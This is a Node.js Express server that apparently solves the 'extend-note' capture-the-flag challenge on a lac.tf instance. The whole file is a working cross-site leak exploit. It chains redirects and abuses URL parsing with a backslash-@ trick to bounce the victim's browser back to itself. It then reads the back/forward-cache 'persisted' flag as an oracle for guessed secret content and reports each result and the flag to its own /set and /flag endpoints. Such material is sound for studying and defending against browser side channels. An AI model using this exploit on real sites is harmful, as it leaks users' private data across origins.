import express from 'express';
import fs from "fs";

const app = express();
const port = 3000;

const TARGET = 'https://extend-note-pt4jh.instancer.lac.tf';

const index = fs.readFileSync("index.html", "utf8");

app.get('/', async (_, res) => {
  console.log('[INFO] Visited /');
  // Pacify RelatedActiveContentsExist and BrowsingInstanceNotSwapped
  res.header('Cross-Origin-Opener-Policy', 'same-origin');
  res.send(index.replace("$TARGET$", TARGET));
});

app.get('/start', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  // Disable disk cache
  res.header("Cache-Control", "no-store");
  res.send(`
  <script type="module">
    window.onpageshow = async function(event) {
      const visited = localStorage.getItem("${guess}") === 'true';
      if (!visited) {
        localStorage.setItem("${guess}", true);

        setTimeout(() => {
          window.location.href = '/a?guess=${encodeURIComponent(guess)}';
        }, 100);

        return;
      }
      
      // Can also use performance.getEntriesByType("navigation")[0]?.notRestoredReasons
      const oracle = !event.persisted;
      await fetch(\`/set?key=${encodeURIComponent(guess)}&value=\${oracle}\`);
      window.close();
    };
  </script>
  `);
});

app.get('/a', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/b?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/b', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/c?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/c', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/d?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/d', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/e?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/e', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  const target_url = new URL(TARGET);
  const redirect = `${target_url.protocol}//${req.host}\\@${target_url.host}`;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '${TARGET}/append?content=${encodeURIComponent(guess)}&url=${encodeURIComponent(redirect)}';
    }, 100);
  </script>
  `);
});

app.get(new RegExp(`^/@${new URL(TARGET).host}$`, "i"), (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  res.type('html');
  res.send(`
  <script>
    window.history.go(-7);
  </script>
  `);
});

const results = new Map();

app.get('/get', (req, res) => {
  const { key } = req.query;
  const value = results.get(key);
  if (value !== undefined) {
    console.log(`[GET] ${key} = ${value}`);
  }
  res.send(value);
});

app.get('/set', (req, res) => {
  const {
    key,
    value
  } = req.query;

  results.set(key, value);

  console.log(`[SET] ${key} = ${value}`);

  res.send("ACK");
});

app.get('/log', (req, res) => {
  console.log(`[LOG] ${req.query.msg}`);
  res.send("ACK");
});

app.get('/flag', (req, _) => {
  console.log(`[FLAG] ${req.query.flag}`);
  process.exit(0);
});

app.listen(port, () => {
  console.log(`[INFO] Solver listening at http://localhost:3000`);
});
